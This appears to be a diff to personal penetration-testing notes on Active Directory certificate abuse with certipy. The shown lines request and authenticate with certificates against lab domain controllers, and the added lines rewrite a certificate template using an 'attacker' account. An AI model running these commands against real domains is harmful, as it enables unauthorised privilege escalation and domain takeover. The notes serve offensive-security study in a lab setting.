@@ -21,3 +21,7 @@ certipy req -u Administrator@FCDomain.lab.micheal.com -dc-ip 10.100.119.28 -ns 1
 certipy auth -pfx mycert.pfx -dc-ip 10.0.2.6
 ```
 Can be cracked with [[crackmapexec]]
+# Modifying Template
+```
+certipy template -y 'attacker@corp.local' -p 'password' -dc-ip '10.0.0.100' -template 'targettmp' -write-default-configuration
+```
